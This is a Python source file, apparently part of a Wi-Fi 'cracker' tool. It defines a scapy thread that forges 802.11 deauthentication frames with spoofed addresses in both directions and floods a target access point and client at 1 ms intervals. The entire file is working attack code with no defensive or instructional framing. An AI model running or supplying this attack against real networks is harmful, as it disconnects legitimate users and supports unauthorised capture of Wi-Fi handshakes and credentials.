import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_worker(target_bssid, target_client, network_interface, count, interval, stop_signal):
    """EXACT same implementation used in cracker menu"""
    print(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid}")
    
    # Craft both direction packets like in cracker
    dot11_to_client = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    deauth_frame_to_client = RadioTap()/dot11_to_client/Dot11Deauth(reason=7)
    
    dot11_to_ap = Dot11(addr1=target_bssid, addr2=target_client, addr3=target_client) 
    deauth_frame_to_ap = RadioTap()/dot11_to_ap/Dot11Deauth(reason=7)
    
    # Use same aggressive timing as cracker
    while not stop_signal.is_set():
        try:
            # Send bursts to both client and AP
            sendp([deauth_frame_to_client, deauth_frame_to_ap], 
                  iface=network_interface, 
                  count=count, 
                  inter=0.001,  # 1ms between packets
                  verbose=False)
                  
            stop_signal.wait(interval)
            
        except Exception as e:
            print(f"[Deauth Error] {e}")
            stop_signal.set()

    print("[Deauth Thread] Stopped.")